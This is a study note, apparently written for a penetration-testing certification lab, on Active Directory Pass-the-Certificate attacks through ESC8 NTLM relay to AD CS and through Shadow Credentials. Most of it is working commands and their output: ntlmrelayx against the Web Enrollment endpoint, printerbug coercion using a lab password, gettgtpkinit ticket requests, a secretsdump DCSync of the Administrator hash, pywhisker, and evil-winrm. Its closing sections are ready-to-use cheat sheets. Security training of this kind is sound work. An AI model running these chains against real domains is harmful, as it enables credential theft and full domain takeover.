# 🔐 1. Pass the Certificate

> [!info]  
> **Pass-the-Certificate (PtC)** uses an **X.509 certificate + private key** with **Kerberos PKINIT** to obtain a **Ticket Granting Ticket (TGT)** for an AD identity.
> 
> The attack paths covered here are mainly:
> 
> - 🔥 **AD CS NTLM Relay — ESC8**
>     
> - 👻 **Shadow Credentials**
>     
> - 🎟️ **Certificate → TGT → Pass-the-Ticket**
>     

---

# 🧠 2. PKINIT — The Foundation

**PKINIT** = **Public Key Cryptography for Initial Authentication**.

It extends Kerberos so public-key cryptography can be used during the initial authentication exchange.

```text
Normal Kerberos:
Username / Password
       ↓
      KDC
       ↓
      TGT

PKINIT:
Certificate + Private Key
       ↓
      KDC
       ↓
      TGT
```

This is commonly used for **smart-card authentication**, where the private key is stored on the smart card.

### 🎯 Core idea

```text
X.509 Certificate
        ↓
      PKINIT
        ↓
       TGT
        ↓
Pass-the-Ticket
        ↓
Kerberos authentication
```

> [!important]  
> **Pass-the-Certificate is the certificate-to-TGT step.**
> 
> Once the `.ccache` TGT has been obtained, the attack becomes a normal **Pass-the-Ticket** workflow.

---

# 🔥 3. AD CS NTLM Relay — ESC8

**ESC8** is an **NTLM relay attack against an AD CS HTTP enrollment endpoint**.

AD CS can provide certificate enrollment through **Web Enrollment**, commonly available at:

```text
http://<CA-IP>/CertSrv
```

The critical attack chain is:

```text
Victim / DC
    │
    │ NTLM authentication
    ▼
Attacker
    │
    │ NTLM Relay
    ▼
AD CS Web Enrollment
    │
    │ Certificate
    ▼
DC01.pfx
    │
    │ PKINIT
    ▼
DC01$ TGT
```

> [!important]  
> ESC8 is particularly powerful because the attacker can turn a **relayed machine-account authentication** into a certificate that can later be used for **Kerberos authentication**.

---

# 🌐 4. Know Your IP Addresses

One of the easiest ways to get confused during this attack is mixing up the **attacker**, **AD CS/CA**, and **Domain Controller** IPs.

In the lab example:

|IP|Role|Used For|
|---|---|---|
|`10.129.234.172`|🏢 **AD CS / Certificate Authority server**|Web Enrollment target for `ntlmrelayx`|
|`10.129.234.174`|🎯 **Domain Controller (DC01)**|PKINIT/KDC, Kerberos authentication, DCSync/target|
|`10.10.16.12`|💻 **Attacker**|Receives coerced authentication|

### 🧠 Remember

```text
10.129.234.172
       │
       └── AD CS / CA
           "Give me a certificate"

10.129.234.174
       │
       └── Domain Controller / KDC
           "Give me a Kerberos TGT"

10.10.16.12
       │
       └── Attacker
           "Send authentication here"
```

> [!warning]  
> The IP used with `gettgtpkinit.py -dc-ip` is the **Domain Controller/KDC IP**, **not automatically the AD CS server IP**.
> 
> In this lab:
> 
> **CA = `10.129.234.172`**
> 
> **DC/KDC = `10.129.234.174`**

---

# 🛠️ 5. Start ntlmrelayx

The attacker listens for incoming authentication and relays it to the AD CS Web Enrollment endpoint.

The lab command used was:

```bash
ntlmrelayx.py -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication --http-port 8080
```

### 🔎 IP roles in this command

```text
-t http://10.129.234.172/certsrv/certfnsh.asp
       ↑
       AD CS / Certificate Authority
       Web Enrollment endpoint

ntlmrelayx itself
       ↑
       Running on ATTACKER
```

### 🔎 Important options

|Option|Meaning|
|---|---|
|`-t`|Relay target|
|`--adcs`|Enable AD CS certificate enrollment|
|`-smb2support`|Enable SMB2 support|
|`--template KerberosAuthentication`|Certificate template requested for Kerberos authentication|
|`--http-port 8080`|Run ntlmrelayx's HTTP listener on port `8080`|

> [!tip]  
> The `--template` value is environment-dependent. In the lab it was `KerberosAuthentication`. Certificate templates can be enumerated with tools such as **Certipy**.

---

# 🖨️ 6. Coerce the Domain Controller

We need the victim machine to authenticate to our attacker.

The lab uses the **Printer Bug** to coerce the Domain Controller.

```bash
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.174 10.10.16.12
```

### 🌐 IP roles

```text
10.129.234.174
      ↑
      TARGET / Domain Controller (DC01)

10.10.16.12
      ↑
      ATTACKER
```

So:

```text
printerbug.py
     │
     │ Coerce
     ▼
DC01 (10.129.234.174)
     │
     │ NTLM authentication
     ▼
Attacker (10.10.16.12)
```

The target requires the **Print Spooler** service to be running.

Example output:

```text
[*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attempting to trigger authentication via rprn RPC at 10.129.234.174
[*] Bind OK
[*] Got handle
RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
[*] Triggered RPC backconnect, this may or may not have worked
```

> [!warning]  
> `RPC_S_SERVER_UNAVAILABLE` does not necessarily mean the coercion failed. Check `ntlmrelayx` for the incoming authentication.

---

# 🔄 7. Verify the Relay Worked

The important `ntlmrelayx` output looks like:

```text
[*] Servers started, waiting for connections

[*] (SMB): Received connection from 10.129.234.174, attacking target http://10.129.234.172

[*] HTTP server returned error code 200, treating as a successful login

[*] (SMB): Authenticating connection from INLANEFREIGHT/DC01$@10.129.234.174 against http://10.129.234.172 SUCCEED
```

### 🧠 Read the output carefully

```text
Received connection from 10.129.234.174
              ↑
              DC01 / victim

attacking target http://10.129.234.172
              ↑
              AD CS / CA
```

Therefore:

```text
DC01 (10.129.234.174)
          │
          │ NTLM
          ▼
     ntlmrelayx
          │
          │ Relay
          ▼
AD CS (10.129.234.172)
```

---

# 📜 8. Certificate Successfully Issued

The successful relay continues:

```text
[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> Using template name: KerberosAuthentication
[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> Generating CSR...
[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> CSR generated!
[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> Getting certificate...
[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> GOT CERTIFICATE! ID 33
[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> Writing PKCS#12 certificate to ./DC01.pfx
[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> Certificate successfully written to file
```

### 🚨 The key success indicators

Look for:

```text
GOT CERTIFICATE!
```

and:

```text
Writing PKCS#12 certificate to ./DC01.pfx
```

and finally:

```text
Certificate successfully written to file
```

> [!success]  
> This means the **ESC8 portion succeeded**:
> 
> **DC01 authentication → NTLM Relay → AD CS → DC01 certificate → `DC01.pfx`**

---

# 📦 9. Understand the `.pfx`

The resulting:

```text
DC01.pfx
```

is a **PKCS#12** file.

It contains the certificate material required for the next stage, including the private key.

```text
DC01$
  │
  │ NTLM Relay
  ▼
AD CS
  │
  │ Certificate
  ▼
DC01.pfx
  │
  │ Certificate + Private Key
  ▼
PKINIT
```

---

# 🎟️ 10. Certificate → TGT with gettgtpkinit.py

Now switch from the **AD CS server** to the **Domain Controller/KDC**.

Install **PKINITtools**:

```bash
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
```

If you encounter:

```text
Error detecting the version of libcrypto
```

install `oscrypto`:

```bash
pip3 install -I git+https://github.com/wbond/oscrypto.git
```

---

# 🎯 11. Request the DC01$ TGT

In this lab, the correct command is:

```bash
python3 gettgtpkinit.py -cert-pfx /root/DC01.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

### 🔎 Understand every important part

```text
-cert-pfx /root/DC01.pfx
       ↓
Certificate obtained from AD CS

-dc-ip 10.129.234.174
       ↓
Domain Controller / KDC
NOT the AD CS server

inlanefreight.local/dc01$
       ↓
Identity we want the TGT for

/tmp/dc.ccache
       ↓
Save the resulting Kerberos credential cache here
```

### 🧠 The IP distinction

```text
AD CS:
10.129.234.172
     ↓
Used earlier by ntlmrelayx

Domain Controller:
10.129.234.174
     ↓
Used by gettgtpkinit.py -dc-ip
```

> [!important]  
> **`-dc-ip` means "which KDC/DC should process my Kerberos request?"**
> 
> Therefore, use the **Domain Controller's IP**.

Successful output includes:

```text
[*] Loading certificate and key from file
[*] Requesting TGT
[*] AS-REP encryption key (you might need this later):
[*] 3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
[*] Saved TGT to file
```

Result:

```text
/tmp/dc.ccache
```

---

# ⏱️ 12. What Happens During `gettgtpkinit.py`?

The command communicates with the **KDC on the Domain Controller**.

```text
DC01.pfx
   │
   │ Certificate authentication
   ▼
KDC / DC01
   │
   │ PKINIT
   ▼
TGT for DC01$
   │
   ▼
/tmp/dc.ccache
```

> [!info]  
> `Requesting TGT` means the tool is actively communicating with the KDC. Normally the operation should complete quickly, but network connectivity, routing, or KDC responsiveness can cause delays/timeouts.

---

# 🎫 13. Use the TGT — Pass-the-Ticket

Once the TGT exists, export it:

```bash
export KRB5CCNAME=/tmp/dc.ccache
```

Verify:

```bash
klist
```

You should see a principal similar to:

```text
Default principal: dc01$@INLANEFREIGHT.LOCAL
```

and:

```text
krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

Mental model:

```text
Certificate
    ↓
PKINIT
    ↓
TGT
    ↓
.ccache
    ↓
KRB5CCNAME
    ↓
Kerberos-aware tools
```

---

# 💀 14. DCSync with the DC01$ TGT

The Domain Controller machine account can be extremely powerful.

The source demonstrates using:

```bash
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

### 🌐 IP role

```text
10.129.234.174
      ↑
      Domain Controller / target
```

It is **not** the AD CS server.

### 🔎 Important options

|Option|Meaning|
|---|---|
|`-k`|Use Kerberos authentication|
|`-no-pass`|Do not request a password|
|`-dc-ip 10.129.234.174`|Domain Controller IP|
|`-just-dc-user Administrator`|Request credentials for the specified domain user|

The attack uses the **DRSUAPI** method to retrieve domain secrets.

```text
DC01$ TGT
    ↓
Kerberos authentication
    ↓
DRSUAPI / DCSync
    ↓
Domain credential material
    ↓
Administrator NTLM hash
```

---

# 🧩 15. Troubleshooting: The IP Matters

A major lesson from the lab is that **different stages use different machines**.

### ❌ Wrong mental model

```text
"Use the same IP everywhere."
```

### ✅ Correct mental model

```text
             ATTACKER
          10.10.16.12
               │
               │ Coerce authentication
               │
               ▼
        DOMAIN CONTROLLER
         10.129.234.174
               │
               │ NTLM authentication
               ▼
            ATTACKER
               │
               │ Relay
               ▼
          AD CS / CA
         10.129.234.172
               │
               │ Certificate
               ▼
          DC01.pfx
               │
               │ PKINIT
               ▼
        DOMAIN CONTROLLER
         10.129.234.174
               │
               │ TGT
               ▼
         /tmp/dc.ccache
```

### 📌 Quick rule

|Command|IP should represent|
|---|---|
|`printerbug.py ... @<IP> <attacker-IP>`|First IP = 🎯 **Target/DC**, second IP = 💻 **Attacker**|
|`ntlmrelayx -t http://<IP>/certsrv/...`|IP = 🏢 **AD CS / CA**|
|`gettgtpkinit.py -dc-ip <IP>`|IP = 🎯 **Domain Controller / KDC**|
|`secretsdump -dc-ip <IP>`|IP = 🎯 **Domain Controller**|
|`evil-winrm -i <IP>`|IP = 🎯 **Remote Windows target**|

> [!important]  
> This distinction explains the timeout encountered when the **AD CS IP** was supplied to `gettgtpkinit.py`.
> 
> If the CA is a separate server, `gettgtpkinit.py -dc-ip` must point to the **DC/KDC**, not the CA.

---

# 👻 16. Shadow Credentials

A second major Pass-the-Certificate path is **Shadow Credentials**.

The attack abuses:

```text
msDS-KeyCredentialLink
```

This AD attribute stores public keys that can be used for authentication through PKINIT.

BloodHound represents the relevant permission as:

```text
AddKeyCredentialLink
```

Meaning one account has sufficient write permissions over another account's:

```text
msDS-KeyCredentialLink
```

attribute.

---

# 🔑 17. Shadow Credential Attack Flow

```text
Attacker has write access
          │
          ▼
msDS-KeyCredentialLink
          │
          │ Add attacker's public key
          ▼
Victim account
          │
          │ Use corresponding private key
          ▼
X.509 certificate / PFX
          │
          ▼
PKINIT
          │
          ▼
Victim TGT
          │
          ▼
Pass-the-Ticket
```

> [!important]  
> The critical prerequisite is **write access to the victim's `msDS-KeyCredentialLink` attribute**.

---

# 🛠️ 18. Shadow Credentials with pywhisker

Example:

```bash
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```

This performs several operations:

```text
1. Find target account
2. Generate X.509 certificate
3. Generate KeyCredential
4. Add public key to msDS-KeyCredentialLink
5. Export certificate/private key as PFX
```

Example result:

```text
[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 3496da7f-ab0d-13e0-1273-5abca66f901d
[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: eFUVVTPf.pfx
[+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
[*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
```

Result:

```text
eFUVVTPf.pfx
```

---

# 🎟️ 19. Get the Victim's TGT

Use the generated PFX:

```bash
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

Again:

```text
-cert-pfx
    ↓
Certificate/private key

-pfx-pass
    ↓
Password protecting PFX

-dc-ip
    ↓
Domain Controller / KDC

INLANEFREIGHT.LOCAL/jpinkman
    ↓
Victim identity

/tmp/jpinkman.ccache
    ↓
Output TGT cache
```

Successful result:

```text
[*] Loading certificate and key from file
[*] Requesting TGT
[*] AS-REP encryption key (you might need this later):
[*] f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
[*] Saved TGT to file
```

---

# 🎫 20. Verify and Use the Victim TGT

Set the cache:

```bash
export KRB5CCNAME=/tmp/jpinkman.ccache
```

Check it:

```bash
klist
```

Expected:

```text
Ticket cache: FILE:/tmp/jpinkman.ccache
Default principal: jpinkman@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

The important parts are:

```text
Default principal:
jpinkman@INLANEFREIGHT.LOCAL
```

and:

```text
krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

which indicates the cache contains the domain TGT.

---

# 🖥️ 21. Remote Access with Evil-WinRM

If the victim account has appropriate WinRM permissions, such as membership in:

```text
Remote Management Users
```

the Kerberos TGT can be used with **Evil-WinRM**.

```bash
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

### 🌐 IP/hostname role

```text
dc01.inlanefreight.local
        ↓
Remote Windows target / Domain Controller
```

Successful authentication:

```text
*Evil-WinRM* PS C:\Users\jpinkman\Documents> whoami
inlanefreight\jpinkman
```

Mental model:

```text
Shadow Credentials
       ↓
Victim Certificate
       ↓
PKINIT
       ↓
Victim TGT
       ↓
KRB5CCNAME
       ↓
Evil-WinRM
       ↓
Remote session as victim
```

---

# 🚫 22. What If PKINIT Is Not Supported?

Sometimes a certificate can be obtained but cannot be used for PKINIT for a particular identity.

For example:

```text
Certificate obtained
       ↓
PKINIT attempted
       ↓
KDC does not support appropriate EKU
       ↓
PKINIT fails
```

The source introduces:

```text
PassTheCert
```

This can authenticate against **LDAPS using a certificate** and perform attacks such as:

- Changing passwords
    
- Granting DCSync rights
    

> [!warning]  
> PassTheCert is a different certificate-based attack path and is outside the scope of this section.

---

# 🧠 23. ESC8 vs Shadow Credentials

|Feature|ESC8|Shadow Credentials|
|---|---|---|
|Main weakness|NTLM relay to AD CS|Write access to `msDS-KeyCredentialLink`|
|AD CS required|Yes|Not necessarily|
|NTLM relay required|Yes|No|
|Certificate generated by|AD CS|Attacker/tool|
|Main tool|`ntlmrelayx`|`pywhisker`|
|PKINIT used|Yes|Yes|
|TGT obtained|Yes|Yes|
|Common target|Machine/account|User/account|
|BloodHound relevance|AD CS attack paths|`AddKeyCredentialLink`|

---

# ⚡ 24. Complete ESC8 Cheat Sheet

```text
                    💻 ATTACKER
                   10.10.16.12
                        │
                        │ Printer Bug
                        │
                        ▼
              🎯 DOMAIN CONTROLLER
                 10.129.234.174
                        │
                        │ NTLM authentication
                        ▼
                 💻 ATTACKER
                  ntlmrelayx
                        │
                        │ Relay
                        ▼
                 🏢 AD CS / CA
                 10.129.234.172
                        │
                        │ Certificate
                        ▼
                    DC01.pfx
                        │
                        │ PKINIT
                        ▼
              🎯 DOMAIN CONTROLLER
                 10.129.234.174
                        │
                        │ TGT
                        ▼
                /tmp/dc.ccache
                        │
                        ▼
              Pass-the-Ticket
                        │
                        ▼
                 DCSync / Access
```

### 🔑 Commands

**1. Relay to AD CS:**

```bash
ntlmrelayx.py -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication --http-port 8080
```

`10.129.234.172` = 🏢 **AD CS / CA**

**2. Coerce DC authentication:**

```bash
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.174 10.10.16.12
```

`10.129.234.174` = 🎯 **DC**

`10.10.16.12` = 💻 **Attacker**

**3. Request TGT:**

```bash
python3 gettgtpkinit.py -cert-pfx /root/DC01.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

`10.129.234.174` = 🎯 **DC/KDC**

**4. Load ticket:**

```bash
export KRB5CCNAME=/tmp/dc.ccache
```

**5. Verify ticket:**

```bash
klist
```

**6. DCSync:**

```bash
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

`10.129.234.174` = 🎯 **DC**

---

# 🧠 25. Complete Shadow Credentials Cheat Sheet

```text
BloodHound
    ↓
AddKeyCredentialLink
    ↓
Write msDS-KeyCredentialLink
    ↓
pywhisker
    ↓
Certificate + PFX
    ↓
gettgtpkinit.py
    ↓
Victim TGT
    ↓
.ccache
    ↓
KRB5CCNAME
    ↓
Kerberos authentication
```

### 🔑 Commands

**1. Add Shadow Credential:**

```bash
pywhisker --dc-ip <DC-IP> -d INLANEFREIGHT.LOCAL -u <attacker> -p '<password>' --target <victim> --action add
```

`<DC-IP>` = 🎯 **Domain Controller**

**2. Request victim TGT:**

```bash
python3 gettgtpkinit.py -cert-pfx <victim.pfx> -pfx-pass '<PFX-password>' -dc-ip <DC-IP> INLANEFREIGHT.LOCAL/<victim> /tmp/<victim>.ccache
```

`<DC-IP>` = 🎯 **Domain Controller/KDC**

**3. Load TGT:**

```bash
export KRB5CCNAME=/tmp/<victim>.ccache
```

**4. Verify:**

```bash
klist
```

**5. Use Kerberos access:**

```bash
evil-winrm -i <target> -r inlanefreight.local
```

`<target>` = 🎯 **Remote Windows machine**

---

# 🎯 26. Final CPTS Mental Model

> [!success]  
> **Pass-the-Certificate is easiest to remember as a conversion chain.**

```text
             🔑 CERTIFICATE
                    │
                    ▼
                 PKINIT
                    │
                    ▼
              🎟️ TGT / .ccache
                    │
                    ▼
          🎫 PASS-THE-TICKET
                    │
          ┌─────────┴─────────┐
          ▼                   ▼
      🖥️ WinRM             💀 DCSync
```

### 🔥 ESC8

```text
Coerce
  ↓
NTLM Relay
  ↓
AD CS
  ↓
Certificate
  ↓
PKINIT
  ↓
TGT
```

### 👻 Shadow Credentials

```text
Write msDS-KeyCredentialLink
  ↓
Add public key
  ↓
Certificate / PFX
  ↓
PKINIT
  ↓
TGT
```

### 📌 The IP rule

```text
ntlmrelayx
    ↓
AD CS IP

printerbug
    ↓
Target/DC IP + Attacker IP

gettgtpkinit.py
    ↓
DC/KDC IP

secretsdump
    ↓
DC IP

evil-winrm
    ↓
Remote Windows target
```

> [!important]  
> **The single most important distinction from this lab:**
> 
> **AD CS IP ≠ necessarily DC IP.**
> 
> The **AD CS server** issues the certificate, while the **Domain Controller/KDC** handles the Kerberos PKINIT request.
> 
> In the lab:
> 
> `10.129.234.172` → **AD CS / CA**
> 
> `10.129.234.174` → **Domain Controller / KDC**
> 
> `10.10.16.12` → **Attacker**

### 🧠 One-line memory hook

> **“Relay to the CA, get the certificate, ask the DC/KDC for the TGT, then use the TGT like any other Kerberos ticket.”**